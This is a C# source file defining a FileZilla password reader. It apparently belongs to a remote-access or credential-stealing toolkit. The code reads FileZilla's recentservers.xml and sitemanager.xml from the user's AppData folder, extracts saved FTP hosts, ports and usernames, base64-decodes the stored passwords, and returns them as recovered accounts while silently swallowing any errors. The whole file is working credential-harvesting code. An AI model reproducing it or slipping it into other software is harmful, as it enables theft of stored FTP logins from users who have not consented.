﻿using Q3C273.Shared.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace Ton618.Recovery.FtpClients
{
    public class FileZillaPassReader : IAccountReader
    {
        /// <inheritdoc />
        public string ApplicationName => "FileZilla";

        public string RecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

        public string SiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

        /// <inheritdoc />
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            var data = new List<RecoveredAccount>();
            try
            {
                if (!File.Exists(RecentServerPath) && !File.Exists(SiteManagerPath))
                    return data;

                if (File.Exists(RecentServerPath))
                {
                    var xmlTReader = new XmlTextReader(RecentServerPath);
                    var xmlDoc = new XmlDocument();
                    xmlDoc.Load(xmlTReader);

                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                    {
                        var szHost = string.Empty;
                        var szUsername = string.Empty;
                        var szPassword = string.Empty;
                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                        {
                            if (xmlNodeChild.Name == "Host")
                                szHost = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Port")
                                szHost = szHost + ":" + xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "User")
                                szUsername = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Pass")
                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                        }

                        data.Add(new RecoveredAccount
                        {
                            Url = szHost,
                            Username = szUsername,
                            Password = szPassword,
                            Application = ApplicationName
                        });
                    }
                }

                if (File.Exists(SiteManagerPath))
                {
                    var xmlTReader = new XmlTextReader(SiteManagerPath);
                    var xmlDoc = new XmlDocument();
                    xmlDoc.Load(xmlTReader);

                    foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                    {
                        var szHost = string.Empty;
                        var szUsername = string.Empty;
                        var szPassword = string.Empty;
                        foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                        {
                            if (xmlNodeChild.Name == "Host")
                                szHost = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Port")
                                szHost = szHost + ":" + xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "User")
                                szUsername = xmlNodeChild.InnerText;
                            if (xmlNodeChild.Name == "Pass")
                                szPassword = Base64Decode(xmlNodeChild.InnerText);
                        }

                        data.Add(new RecoveredAccount
                        {
                            Url = szHost,
                            Username = szUsername,
                            Password = szPassword,
                            Application = "FileZilla"
                        });
                    }
                }
                return data;
            }
            catch
            {
                return data;
            }
        }

        public string Base64Decode(string szInput)
        {
            try
            {
                var base64ByteArray = Convert.FromBase64String(szInput);
                return Encoding.UTF8.GetString(base64ByteArray);
            }
            catch
            {
                return szInput;
            }
        }
    }
}
